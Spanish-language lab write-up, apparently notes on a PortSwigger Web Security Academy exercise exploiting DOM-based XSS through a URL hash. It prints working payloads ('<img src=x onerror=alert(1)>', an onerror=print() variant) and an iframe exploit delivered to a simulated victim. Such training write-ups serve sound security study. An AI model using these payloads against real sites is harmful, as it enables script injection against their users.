Este es el laboratorio:
![[Pasted image 20240524104657.png]]
En el enunciado nos dicen que Para resolver el laboratorio, tenemos que enviar a una víctima un exploit que aproveche la vulnerabilidad del laboratorio para ejecutar la función print(). 

------------

Si revisamos el código fuente, nos encontramos con esto:
![[Pasted image 20240524105023.png]]
Podemos ahora probar en poner una almohadilla en la URL y ver si nos redirije a la coincidencia, donde vemos que sí:
![[Pasted image 20240524105502.png]]
En este punto, después del hashtag podemos inyectar el siguiente payload para explotar un XSS:
```bash
<img src=x onerror=alert(1)>
```
![[Pasted image 20240524105604.png]]
También podemos llamar a la función print para que en caso de que la img no existe, que entonces ejecute un print:
```bash
<img src=/ onerror=print()>
```
![[Pasted image 20240524105747.png]]
Y efectivamente se ejecuta. Ahora tenemos que crear un exploit que mandemos a la víctima y se haga uso de esta vulnerabilidad. Para ello nos vamos al servidor del exploit:
![[Pasted image 20240524105828.png]]
![[Pasted image 20240524105839.png]]
En el body, insertamos el siguiente payload:
```html
<iframe src="https://0a3e0048041d146880fc07ff008e00fc.web-security-academy.net/#" onload="this.src+='<img src=/ onerror=print()>'"></iframe>
```
![[Pasted image 20240524110641.png]]
Visualizamos el exploit y vemos que se ejecuta la función print():
![[Pasted image 20240524110702.png]]
Por lo que lo enviaremos:
![[Pasted image 20240524110721.png]]
Y ya se habrá resuelto el laboratorio:
![[Pasted image 20240524110735.png]]